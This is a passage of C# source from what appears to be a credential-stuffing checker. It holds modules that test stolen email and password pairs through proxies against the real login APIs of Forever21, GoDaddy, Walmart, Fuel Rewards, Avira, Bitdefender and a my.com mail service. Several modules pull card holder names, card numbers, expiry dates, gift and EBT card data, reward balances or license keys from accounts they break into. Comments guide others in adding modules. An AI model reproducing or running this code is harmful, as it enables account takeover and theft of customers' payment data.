                catch
                {
                    Check.errors++;
                    continue;
                }
            }
        }
        #endregion

        #region Forever21
        static string Forever21(string email, string password)
        {
            for (; ; )
            {
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);
                        req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
                        req.AddHeader("Pragma", "no-cache");
                        req.AddHeader("Accept", "*/*");
                        req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                        HttpResponse res = req.Get(new Uri("https://www.forever21.com/us/shop/account/signin"));

                        string response = res.ToString();
                        string token = Parse(response, "window.NREUM||(NREUM={})).loader_config={xpid:\"", "\"");
                        req.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                        req.AddHeader("Accept", "application/json, text/javascript, */*; q=0.01");
                        req.AddHeader("X-NewRelic-ID", token);
                        req.AddHeader("Origin", "https://www.forever21.com");
                        req.AddHeader("Referer", "https://www.forever21.com/us/shop/account/signin");
                        string data = "userid=&id=" + email + "&password=" + password + "&isGuest=";
                        HttpResponse res2 = req.Post(new Uri($"https://www.forever21.com/us/shop/Account/DoSignIn"), new BytesContent(Encoding.Default.GetBytes(data)));
                        string tokenlogin = res2.ToString();
                        if (tokenlogin.Contains("\"ErrorMessage\":\"\""))
                        {
                            string UID = Parse(tokenlogin, "\"UserId\":\"", "\"");
                            string data2 = "userid=" + UID;
                            HttpResponse res3 = req.Post(new Uri($"https://www.forever21.com/us/shop/Account/GetCreditCardList"), new BytesContent(Encoding.Default.GetBytes(data2)));
                            string cardlogin = req.Post("https://www.forever21.com/us/shop/Account/GetCreditCardList", "userid=" + UID, "application/x-www-form-urlencoded").ToString();
                            if (cardlogin.Contains("Credit Card Information cannot be found."))
                            {
                                return "Free";
                            }
                            else
                            {
                                string CardHolder = Parse(cardlogin, "\"CardHolder\":\"", "\"");
                                string CardType = Parse(cardlogin, "\"CardType\":\"", "\"");
                                string CardNumber = Parse(cardlogin, "\"DisplayName\":\"" + CardType + "<br>", "\"");
                                string ExpirationMonth = Parse(cardlogin, "\"ExpirationMonth\":\"", "\"");
                                string ExpirationYear = Parse(cardlogin, "\"ExpirationYear\":\"", "\"");
                                return "Card Holder: " + CardHolder + " | Card Number: " + CardNumber + " | Card Type: " + CardType + " | Expiry: " + ExpirationMonth + " / " + ExpirationYear;

                            }

                        }
                        else
                        {
                            if (tokenlogin.Contains("Connection: close"))
                            {
                                Check.errors++;
                            }
                            else if (tokenlogin.Contains("User cannot be found"))
                            {
                                return "Bad";
                            }
                            else if (tokenlogin.Contains("Your email or password is incorrect. Please try again."))
                            {
                                return "Bad";
                            }
                        }
                    }
                }
                catch
                {
                    Check.errors++;
                    continue;
                }
            }
        }
        #endregion

        #region Chegg
        static string Chegg(string email, string password)
        {
            return "Module Disabled!";

        }
        #endregion

        #region GoDaddy
        static string GoDaddy(string email, string password)
        {
            for (; ; )
            {
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);
                        string str1 = req.Post("https://sso.godaddy.com/v1/api/idp/user/checkusername", "{\"checkusername\":\"" + email + "\"}", "application/json").ToString();
                        if (str1.Contains("username is unavailable") || str1.Contains("message\": \"Ok"))
                        {
                            string str2 = req.Post("https://sso.godaddy.com/v1/api/idp/login?realm=idp&path=%2Fproducts&app=account", "{\"username\":\"" + email + "\",\"password\":\"" + password + "\",\"remember_me\":false,\"plid\":1,\"API_HOST\":\"godaddy.com\",\"captcha_code\":\"\",\"captcha_type\":\"recaptcha_v2_invisible\"}", "application/json").ToString();
                            if (str2.Contains("Username and password did not match"))
                            {
                                return "Bad";
                            }
                            else if (str2.Contains("User account is timer locked"))
                            {
                                Check.errors++;
                                continue;
                            }
                            else if (str2.Contains("message\": \"Ok\""))
                            {
                                return "Hit";
                            }
                        }
                        else if (str1.Contains("username is invalid"))
                        {
                            return "Bad";
                        }
                        else if (str1.Contains("username is available"))
                        {
                            return "Bad";
                        }
                    }
                }
                catch
                {
                    Check.errors++;
                    continue;
                }
            }
        }
        #endregion

        #region Walmart
        static string Walmart(string email, string password)
        {
            for (; ; )
            {
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);
                        req.AddHeader("Host", "www.walmart.com");
                        req.AddHeader("Content-Type", "application/json");
                        req.AddHeader("Origin", "https://www.walmart.com");
                        req.AddHeader("Referer", "https://www.walmart.com/account/login?tid=0&vid=2&returnUrl=%2F%3Fpp%3D1");
                        req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0");

                        string data = "{\"username\":\"" + email + "\",\"password\":\"" + password + "\",\"rememberme\":true,\"showRememberme\":\"true\",\"captcha\":{\"sensorData\":\"\"}}";

                        HttpResponse res = req.Post(new Uri($"https://www.walmart.com/account/electrode/api/signin?tid=0&vid=2&returnUrl=%2F%3Fpp%3D1"), new BytesContent(Encoding.Default.GetBytes(data)));
                        string res_string = res.ToString();

                        if (res_string.Contains("user_auth_fail") || res_string.Contains("Your password and email do not match"))
                        {
                            return "Bad";
                        }
                        else if (res_string.Contains("firstName"))
                        {
                            req.ClearAllHeaders();
                            req.AddHeader("Host", "www.walmart.com");
                            req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0");
                            req.AddHeader("Accept", "application/json");
                            req.AddHeader("Referer", "https://www.walmart.com/account/creditcards");
                            req.AddHeader("Content-Type", "application/json");

                            HttpResponse res2 = req.Get(new Uri($"https://www.walmart.com/account/electrode/account/api/customer/:CID/payment-method"));
                            string capture = res2.ToString();

                            string giftcards = Parse(capture, "giftCards\":", ",\"");
                            string creditCards = Parse(capture, "creditCards\":", ",\"");
                            string ebtCards = Parse(capture, "ebtCards\":", ",\"");
                            string wallets = Parse(capture, "wallets\":", ",\"");
                            return $"Giftcards: {giftcards} | Credit Cards: {creditCards} | EBT Cards: {ebtCards} | Wallets: {wallets}";
                        }
                        else
                        {
                            Check.errors++;
                            continue;
                        }

                    }
                }
                catch
                {
                    Check.errors++;
                    continue;
                }
            }
        }
        #endregion

        #region Fuel Rewards
        static string FuelRewards(string email, string password)
        {
            for (; ; )
            {
                using (HttpRequest req = new HttpRequest())
                {
                    string acc = email + ":" + password;
                    // Basic stuff, proxies, etc, you can see what id does above
                    SetBasicRequestSettingsAndProxies(req);
                    req.AddHeader("User-Agent", "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-N950N Build/NMF26X)");
                    req.AddHeader("Pragma", "no-cache");
                    req.AddHeader("Content-Type", "application/json");
                    req.AddHeader("Accept", "*/*");
                    req.AddHeader("tags", "[{\"deviceType\":\"and\",\"deviceModeType\":\"cons\",\"deviceOSVer\":\"5.1.1\",\"DeviceID\":\"SM-N950N\"}]");
                    req.AddHeader("access_token", "d23df8e7-1a95-45c3-add3-118316e72ced");
                    req.UserAgent = "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-N950N Build/NMF26X)";
                    // Don't get the response in a string, if you want to get cookies or other stuff it's easier to have it in a httpresponse
                    HttpResponse res;
                    try
                    {
                        // We try to do the request, but don't put the raw website/post data, do it as I did it here: 
                        res = req.Post(new Uri($"https://member-connect.excentus.com/fuelrewards/public/rest/v2/frnExcentus/login"), new BytesContent(Encoding.Default.GetBytes("{\"userId\":\"" + email + "\",\"password\":\"" + password + "\"}")));
                    }
                    catch
                    {
                        // If error then we continue in the loop (retrie)
                        Check.errors++;
                        continue;
                    }
                    string login = res.ToString();
                    if (login.Contains("User name or password not recognized"))
                    {
                        // If the acc is invalid, you just have to return "Bad" REMEMBER TO SPELL IT ALWAYS LIKE THAT
                        return "Bad";
                    }
                    else if (login.Contains("TIER"))
                    {
                        string balance = Parse(login, "rewardBalance\":", ",");
                        string member = Parse(login, "memberId\":\"", "\"");
                        return " Reward Balance = " + balance + " | Member ID = " + member;
                    }
                    else
                    {
                        // retrie
                        continue;
                    }


                }
            }
        }
        #endregion

        #region Avaria
        static string Avaria(string email, string password)
        {
            for (; ; )
            {
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);
                        req.AddHeader("Content-Type", "application/json");
                        req.AddHeader("Authorization", "Basic YXZpcmEvZGFzaGJvYXJkOjAyMjI4OWNjOTZhMTQwOTI4YWQ5ODNjNTJmYTRjYTNlMDZmODBkZDg5NjgwNGE0YmIxNDFkMDc2MjY2YTQ0OTA=");
                        req.AddHeader("Origin", "https://my.avira.com");
                        req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36";
                        string reqdetails = "{\"grant_type\":\"password\",\"username\":\"" + email + "\",\"password\":\"" + password + "\"}";
                        HttpResponse res = req.Post(new Uri($"https://api.my.avira.com/v2/oauth/"), new BytesContent(Encoding.Default.GetBytes(reqdetails)));
                        string response = res.ToString();
                        if (response.Contains("device_token"))
                        {
                            return "Hit";
                        }
                        else
                        {
                            if (response.Contains("Connection: close"))
                            {
                                Check.errors++;
                            }
                            else if (response.Contains("invalid_credentials"))
                            {
                                return "Bad";
                            }
                        }
                    }
                }
                catch
                {
                    Check.errors++;
                    continue;
                }
            }
        }
        #endregion

        #region Defender
        static string Bitdefender(string email, string password)
        {
            for (; ; )
            {
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);
                        req.UserAgent = "Mozilla / 5.0(Windows NT 6.3; Win64; x64) AppleWebKit / 537.36(KHTML, like Gecko) Chrome / 75.0.3770.142 Safari / 537.36";
                        req.AddHeader("referer", "https://my.bitdefender.com/login");
                        req.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(req.SslCertificateValidatorCallback,
                        new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                        string text2 = req.Get(new Uri("https://my.bitdefender.com/lv2/account?login=" + email + "&pass=" + password + "&action=login&type=userpass&fp=web")).ToString();
                        if (text2.Contains("\"token\""))
                        {
                            string token = Parse(text2, "token\": \"", "\"");
                            req.ClearAllHeaders();
                            req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                            string capture = req.Get(new Uri("https://my.bitdefender.com/lv2/get_info?login=" + email + "&token=" + token + "&fields=serials%2Caccount")).ToString();
                            string product_name = Parse(capture, "\"product_name\": \"", "\"");
                            string license_key = Parse(capture, "\"key\": \"", "\"");
                            string max_computers = Parse(capture, "max_computers\": ", ",");
                            string exprires = Parse(capture, "expire_time\": ", ",");
                            return "Product: " + product_name + " | License: " + license_key + " | Max Computers: " + max_computers;


                        }
                        else if (text2.Contains("wrong_login"))
                        {
                            return "Bad";
                        }
                        else
                        {
                            Check.errors++;
                            continue;
                        }
                    }
                }
                catch
                {
                    Check.errors++;
                    continue;
                }
            }
        }
        #endregion

        #region Mail Access
        static string Maill_Access(string email, string password)
        {
            for (; ; )
            {
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);
                        req.UserAgent = "MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0";
                        HttpResponse res = req.Get(new Uri($"https://aj-https.my.com/cgi-bin/auth?model=&simple=1&Login={email}&Password={password}"));
                        string response_string = res.ToString();
                        if (response_string.Contains("Ok=0"))
                        {
                            return "Bad";
                        }
                        else if (response_string.Contains("Ok=1"))
                        {
                            return "Hit";
                        }
                        else
                        {
                            Check.errors++;
                            continue;
                        }
                    }
                }
                catch
                {
                    Check.errors++;
                    continue;
                }
            }
        }
        #endregion

        #region MD5_dehasher
        static string MD5_dehasher(string email, string password)
        {
            for (; ; )
            {
                using (HttpRequest req = new HttpRequest())
                {
                    string acc = email + ":" + password;
                    string acc_encoded = Utils.Base64Encode(acc);
                    SetBasicRequestSettingsAndProxies(req);
                    req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                    HttpResponse res;
                    try
                    {
                        res = req.Get(new Uri($"https://bluecode.info/md5api/?search%5B%5D=" + password + "&"));
                    }
                    catch
                    {
                        Check.errors++;
                        continue;
                    }
                    res.EnumerateHeaders();
                    string login = res.ToString();
                    if (login.Contains("SA"))
                    {
                        // If the acc is invalid, you just have to return "Bad" REMEMBER TO SPELL IT ALWAYS LIKE THAT
                        return "Bad";
                    }
                    else if (login.Contains("{\"ok\":true,\"private\":false}"))
                    {
                        // If the acc is invalid, you just have to return "Bad" REMEMBER TO SPELL IT ALWAYS LIKE THAT
                        return "Bad";
                    }
                    else if (login.Contains("errorCode\":1101"))
                    {
                        // retrie
                        continue;
                    }
                    else if (login.Contains("false,\""))
                    {
                        string response = res.ToString();
                        string passdehashed = Parse(response, password + "\":\"", "\"}");
                        return "MD5" + email + ":" + passdehashed;
                    }


                }
            }
        }
        #endregion

        private static string Parse(string source, string left, string right)
        {
            try
            {
                return source.Split(new string[1] { left }, StringSplitOptions.None)[1].Split(new string[1]
                {
                right
                }, StringSplitOptions.None)[0];
            }
            catch
            {
                return "ERROR";
            }
        }

    }
}
